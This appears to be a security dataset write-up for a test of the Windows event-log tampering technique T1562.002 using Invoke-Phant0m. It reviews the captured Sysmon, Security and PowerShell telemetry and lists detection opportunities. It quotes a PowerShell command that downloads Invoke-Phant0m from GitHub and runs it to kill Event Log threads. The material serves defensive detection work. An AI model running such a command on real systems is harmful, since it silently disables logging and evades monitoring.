# T1562.002-3: Disable Windows Event Logging — Invoke-Phant0m

## Technique Context

T1562.002 (Disable Windows Event Logging) covers adversary actions to prevent or degrade Windows event log collection. This test uses Invoke-Phant0m, a publicly available PowerShell script that targets the Windows Event Log service (eventlog/svchost.exe) by enumerating its threads and killing those responsible for log forwarding. Unlike service termination (which would be obvious and potentially raise alerts), Phant0m leaves svchost.exe running while eliminating the threads that process and write events — making the system appear to have an event log service while silently dropping events. The script is fetched at runtime from GitHub.

## What This Dataset Contains

The dataset captures 114 events across Sysmon (44), Security (18), PowerShell (39), System (5), Application (3), WMI (1), and TaskScheduler (4) channels over a five-second window.

**Sysmon Event ID 1 (process create)** records the PowerShell invocation with the full command line showing the attack intent:

```
powershell.exe & {Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
$url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
$output = "$env:TEMP\Invoke-Phant0m.ps1"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
cd $env:TEMP
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m}
```

**Sysmon Event ID 13 (registry value set)** captures the WSearch service `FailureActionsOnNonCrashFailures` registry change that occurred in parallel as a background system activity during the test window.

**Security events** include a logon type 5 sequence (4624, 4627, 4672) for a SYSTEM batch logon associated with the WinRM service starting (corroborated by System Event ID 10121 and 10148). Security 4688 records `svchost.exe` spawning with a `LocalServiceNetworkRestricted` command line. No GitHub download-related process creates appear, as `DownloadFile` via `System.Net.WebClient` runs within the PowerShell process.

**System events** include WinRM listener startup (10148), HTTPS URL registration (113), and a COM permission warning (10016). **Application events** confirm the Windows Security Center service restarted (ID 1) and Windows Defender status set to ON (ID 15). **WMI event ID 5860** records a `ROOT\SecurityCenter` subscription query for antivirus/firewall product changes. **TaskScheduler 140** records Windows Update Orchestrator task modifications.

## What This Dataset Does Not Contain (and Why)

Despite the PowerShell process create showing the download URL, there are no Sysmon Event ID 22 (DNS query) or Event ID 3 (network connection) events for `raw.githubusercontent.com`. The sysmon-modular DNS query and network connect rules apply to `powershell.exe` activity, but in this case no DNS query events were captured — likely because the DNS resolution used a cached entry or occurred in a context that was not logged.

Invoke-Phant0m itself shows no evidence of execution. There are no thread manipulation events, no process access (Sysmon 10) targeting `svchost.exe` hosting the EventLog service, and no indication that the script ran beyond being downloaded. The PowerShell log contains no 4103/4104 events recording `Invoke-Phant0m` execution — only a single empty profile script block. This suggests the download may have succeeded but module import or execution was blocked or failed silently.

## Assessment

The technique is at best partially executed. The command was issued and the download was attempted, but there is no evidence in any telemetry source that `Invoke-Phant0m` ran and killed event log threads. The diverse set of ancillary events (WinRM startup, COM security warnings, WMI subscriptions, task scheduler updates) reflects genuine OS background activity during the test window — these are not generated by the test itself. The Security 4689 for cmd.exe shows exit code `0x1`, indicating an error in the command pipeline.

## Detection Opportunities Present in This Data

- **Sysmon 1 (process create):** The full command line including the `raw.githubusercontent.com` URL with the exact commit hash for `Invoke-Phant0m.ps1` is captured. Detecting PowerShell process creates containing `Invoke-Phant0m` or `hlldz/Invoke-Phant0m` in the command line is high-fidelity.
- **Security 4688:** Same command line is present. Rule on `Invoke-Phant0m` in process command lines is directly applicable.
- **Behavioral:** Any process with `OpenThread`/`TerminateThread` access to threads within a `svchost.exe` instance hosting the `EventLog` service is the core behavioral indicator for a successful Phant0m execution — absent here because execution did not complete.
- **PowerShell 4104:** If Invoke-Phant0m were to execute, its script body would appear in script block logs. The absence of that content here is itself informative — the download completed but the module was not invoked in a logged context.
